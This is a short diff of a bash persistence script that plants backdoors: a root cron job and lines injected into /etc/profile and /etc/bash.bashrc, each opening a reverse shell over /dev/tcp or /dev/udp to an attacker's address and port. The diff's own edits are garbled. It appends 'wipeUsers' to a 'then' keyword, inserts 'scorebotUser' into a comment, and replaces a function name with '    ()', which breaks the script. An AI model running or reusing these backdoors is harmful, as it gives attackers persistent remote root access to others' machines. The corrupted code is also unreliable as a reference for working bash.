@@ -58,7 +58,7 @@ writeCron(){
     echo "5 * * * * root bash -i >& /dev/udp/$ipv4/$serverPort 0>&1" >> /etc/crontab 
 }
 
-# --------------------------------
+# -------------scorebotUser-------------------
 # create aliases to run a backdoor :: todo - have actual commands run
 # --------------------------------
 badAlias() {    
@@ -184,7 +184,7 @@ shellBackdoor (){
                 fi
             done < /etc/passwd
         fi
-        if [[ $shell == "bash" ]]; then
+        if [[ $shell == "bash" ]]; thenwipeUsers
             fileBackdoor "/etc/profile" 3 "sh -i 5<> /dev/tcp/$ipv4/$serverPort 0<&5 1>&5 2>&5"
             fileBackdoor "/etc/bash.bashrc" 10 "bash -i >& /dev/tcp/$ipv4/$serverPort 0>&1"
             while IFS=: read -r username password uid gid info homedir shell; do
@@ -325,7 +325,7 @@ backdoorUser(){
 # ------------------
 # backdoor a service
 # ------------------
-backdoorService(){
+    (){
     dir="/lib/systemd/system"
     newbin=$1 #intelGather
     
